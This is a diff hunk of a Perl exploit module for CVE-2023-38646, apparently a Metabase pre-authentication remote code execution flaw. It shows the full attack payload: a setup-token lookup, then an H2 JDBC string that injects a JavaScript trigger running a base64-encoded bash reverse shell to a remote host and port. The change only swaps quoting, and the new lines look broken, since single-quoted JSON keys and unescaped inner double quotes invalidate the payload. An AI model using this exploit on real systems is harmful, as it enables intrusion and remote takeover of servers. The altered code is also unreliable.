@@ -35,33 +35,33 @@ package Spellbook::Advisory::CVE_2023_38646 {
             if ($session_response -> code() == 200) {
                 try {
                     my $content = decode_json($session_response -> content);
-                    my $token = $content -> {"setup-token"};
+                    my $token = $content -> {'setup-token'};
 
                     if ($token) {
-                        my $headers = HTTP::Headers -> new ("Content-Type" => "application/json");
-                        my $reverse = encode_base64("bash -i >& /dev/tcp/$remote/$port 0>&1", "");
+                        my $headers = HTTP::Headers -> new ('Content-Type' => 'application/json');
+                        my $reverse = encode_base64("bash -i >& /dev/tcp/$remote/$port 0>&1", '');
 
                         my $payload = qq({
-                            "token": "$token",
-                            "details": {
-                                "is_on_demand": false,
-                                "is_full_sync": false,
-                                "is_sample": false,
-                                "cache_ttl": null,
-                                "refingerprint": false,
-                                "auto_run_queries": true,
-                                "schedules": {},
-                                "details": {
-                                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS \$\$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,$reverse}|{base64,-d}|{bash,-i}')\\n\$\$--=x",
-                                    "advanced-options": false,
-                                    "ssl": true
+                            'token': "$token",
+                            'details': {
+                                'is_on_demand': false,
+                                'is_full_sync': false,
+                                'is_sample': false,
+                                'cache_ttl': null,
+                                'refingerprint': false,
+                                'auto_run_queries': true,
+                                'schedules': {},
+                                'details': {
+                                    'db': "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS \$\$//javascript\\njava.lang.Runtime.getRuntime().exec("bash -c {echo,$reverse}|{base64,-d}|{bash,-i}")\\n\$\$--=x",
+                                    'advanced-options': false,
+                                    'ssl': true
                                 },
-                                "name": "an-sec-research-team",
-                                "engine": "h2"
+                                'name': 'an-sec-research-team',
+                                'engine': 'h2'
                             }
                         });
 
-                        my $validate_request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
+                        my $validate_request  = HTTP::Request -> new('POST', "$target/api/setup/validate", $headers, $payload);
                         my $response = $user_agent -> request($validate_request);
 
                         if ($response -> code() == 400) {
